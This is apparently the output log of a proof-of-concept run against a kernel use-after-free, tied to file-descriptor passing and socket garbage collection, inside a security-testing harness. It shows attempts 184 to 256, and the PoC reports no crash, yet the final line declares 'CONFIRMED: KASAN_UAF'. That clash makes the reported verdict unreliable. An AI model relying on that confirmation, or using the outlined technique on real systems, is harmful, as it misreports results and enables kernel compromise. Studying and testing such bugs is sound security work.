[*] attempt 184/256: trigger_uaf -> 0
[*] attempt 185/256: prepare_uaf
[*] attempt 185/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 185/256: trigger_uaf -> 0
[*] attempt 186/256: prepare_uaf
[*] attempt 186/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 186/256: trigger_uaf -> 1
[*] attempt 187/256: prepare_uaf
[*] attempt 187/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 187/256: trigger_uaf -> 0
[*] attempt 188/256: prepare_uaf
[*] attempt 188/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 188/256: trigger_uaf -> 0
[*] attempt 189/256: prepare_uaf
[*] attempt 189/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 189/256: trigger_uaf -> 0
[*] attempt 190/256: prepare_uaf
[*] attempt 190/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 190/256: trigger_uaf -> 1
[*] attempt 191/256: prepare_uaf
[*] attempt 191/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 191/256: trigger_uaf -> 0
[*] attempt 192/256: prepare_uaf
[*] attempt 192/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 192/256: trigger_uaf -> 1
[*] attempt 193/256: prepare_uaf
[*] attempt 193/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 193/256: trigger_uaf -> 0
[*] attempt 194/256: prepare_uaf
[*] attempt 194/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 194/256: trigger_uaf -> 0
[*] attempt 195/256: prepare_uaf
[*] attempt 195/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 195/256: trigger_uaf -> 0
[*] attempt 196/256: prepare_uaf
[*] attempt 196/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 196/256: trigger_uaf -> 1
[*] attempt 197/256: prepare_uaf
[*] attempt 197/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 197/256: trigger_uaf -> 1
[*] attempt 198/256: prepare_uaf
[*] attempt 198/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 198/256: trigger_uaf -> 0
[*] attempt 199/256: prepare_uaf
[*] attempt 199/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 199/256: trigger_uaf -> 1
[*] attempt 200/256: prepare_uaf
[*] attempt 200/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 200/256: trigger_uaf -> 0
[*] attempt 201/256: prepare_uaf
[*] attempt 201/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 201/256: trigger_uaf -> 0
[*] attempt 202/256: prepare_uaf
[*] attempt 202/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 202/256: trigger_uaf -> 0
[*] attempt 203/256: prepare_uaf
[*] attempt 203/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 203/256: trigger_uaf -> 0
[*] attempt 204/256: prepare_uaf
[*] attempt 204/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 204/256: trigger_uaf -> 0
[*] attempt 205/256: prepare_uaf
[*] attempt 205/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 205/256: trigger_uaf -> 1
[*] attempt 206/256: prepare_uaf
[*] attempt 206/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 206/256: trigger_uaf -> 1
[*] attempt 207/256: prepare_uaf
[*] attempt 207/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 207/256: trigger_uaf -> 1
[*] attempt 208/256: prepare_uaf
[*] attempt 208/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 208/256: trigger_uaf -> 0
[*] attempt 209/256: prepare_uaf
[*] attempt 209/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 209/256: trigger_uaf -> 0
[*] attempt 210/256: prepare_uaf
[*] attempt 210/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 210/256: trigger_uaf -> 0
[*] attempt 211/256: prepare_uaf
[*] attempt 211/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 211/256: trigger_uaf -> 1
[*] attempt 212/256: prepare_uaf
[*] attempt 212/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 212/256: trigger_uaf -> 1
[*] attempt 213/256: prepare_uaf
[*] attempt 213/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 213/256: trigger_uaf -> 1
[*] attempt 214/256: prepare_uaf
[*] attempt 214/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 214/256: trigger_uaf -> 0
[*] attempt 215/256: prepare_uaf
[*] attempt 215/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 215/256: trigger_uaf -> 0
[*] attempt 216/256: prepare_uaf
[*] attempt 216/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 216/256: trigger_uaf -> 0
[*] attempt 217/256: prepare_uaf
[*] attempt 217/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 217/256: trigger_uaf -> 0
[*] attempt 218/256: prepare_uaf
[*] attempt 218/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 218/256: trigger_uaf -> 1
[*] attempt 219/256: prepare_uaf
[*] attempt 219/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 219/256: trigger_uaf -> 0
[*] attempt 220/256: prepare_uaf
[*] attempt 220/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 220/256: trigger_uaf -> 1
[*] attempt 221/256: prepare_uaf
[*] attempt 221/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 221/256: trigger_uaf -> 0
[*] attempt 222/256: prepare_uaf
[*] attempt 222/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 222/256: trigger_uaf -> 0
[*] attempt 223/256: prepare_uaf
[*] attempt 223/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 223/256: trigger_uaf -> 0
[*] attempt 224/256: prepare_uaf
[*] attempt 224/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 224/256: trigger_uaf -> 0
[*] attempt 225/256: prepare_uaf
[*] attempt 225/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 225/256: trigger_uaf -> 1
[*] attempt 226/256: prepare_uaf
[*] attempt 226/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 226/256: trigger_uaf -> 0
[*] attempt 227/256: prepare_uaf
[*] attempt 227/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 227/256: trigger_uaf -> 1
[*] attempt 228/256: prepare_uaf
[*] attempt 228/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 228/256: trigger_uaf -> 0
[*] attempt 229/256: prepare_uaf
[*] attempt 229/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 229/256: trigger_uaf -> 0
[*] attempt 230/256: prepare_uaf
[*] attempt 230/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 230/256: trigger_uaf -> 0
[*] attempt 231/256: prepare_uaf
[*] attempt 231/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 231/256: trigger_uaf -> 1
[*] attempt 232/256: prepare_uaf
[*] attempt 232/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 232/256: trigger_uaf -> 1
[*] attempt 233/256: prepare_uaf
[*] attempt 233/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 233/256: trigger_uaf -> 1
[*] attempt 234/256: prepare_uaf
[*] attempt 234/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 234/256: trigger_uaf -> 1
[*] attempt 235/256: prepare_uaf
[*] attempt 235/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 235/256: trigger_uaf -> 1
[*] attempt 236/256: prepare_uaf
[*] attempt 236/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 236/256: trigger_uaf -> 1
[*] attempt 237/256: prepare_uaf
[*] attempt 237/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 237/256: trigger_uaf -> 0
[*] attempt 238/256: prepare_uaf
[*] attempt 238/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 238/256: trigger_uaf -> 1
[*] attempt 239/256: prepare_uaf
[*] attempt 239/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 239/256: trigger_uaf -> 0
[*] attempt 240/256: prepare_uaf
[*] attempt 240/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 240/256: trigger_uaf -> 0
[*] attempt 241/256: prepare_uaf
[*] attempt 241/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 241/256: trigger_uaf -> 0
[*] attempt 242/256: prepare_uaf
[*] attempt 242/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 242/256: trigger_uaf -> 0
[*] attempt 243/256: prepare_uaf
[*] attempt 243/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 243/256: trigger_uaf -> 0
[*] attempt 244/256: prepare_uaf
[*] attempt 244/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 244/256: trigger_uaf -> 1
[*] attempt 245/256: prepare_uaf
[*] attempt 245/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 245/256: trigger_uaf -> 1
[*] attempt 246/256: prepare_uaf
[*] attempt 246/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 246/256: trigger_uaf -> 1
[*] attempt 247/256: prepare_uaf
[*] attempt 247/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 247/256: trigger_uaf -> 1
[*] attempt 248/256: prepare_uaf
[*] attempt 248/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 248/256: trigger_uaf -> 0
[*] attempt 249/256: prepare_uaf
[*] attempt 249/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 249/256: trigger_uaf -> 1
[*] attempt 250/256: prepare_uaf
[*] attempt 250/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 250/256: trigger_uaf -> 0
[*] attempt 251/256: prepare_uaf
[*] attempt 251/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 251/256: trigger_uaf -> 1
[*] attempt 252/256: prepare_uaf
[*] attempt 252/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 252/256: trigger_uaf -> 0
[*] attempt 253/256: prepare_uaf
[*] attempt 253/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 253/256: trigger_uaf -> 0
[*] attempt 254/256: prepare_uaf
[*] attempt 254/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 254/256: trigger_uaf -> 1
[*] attempt 255/256: prepare_uaf
[*] attempt 255/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 255/256: trigger_uaf -> 0
[*] attempt 256/256: prepare_uaf
[*] attempt 256/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 256/256: trigger_uaf -> 0
[*] 256 attempts exhausted without KASAN
[   19.287040] poc (65) used greatest stack depth: 26896 bytes left
---- poc end rc=0 ----
secb: poc exited without crashing the kernel
[   20.665503] ACPI: PM: Preparing to enter system sleep state S5
[   20.668409] reboot: Power down
CONFIRMED: KASAN_UAF
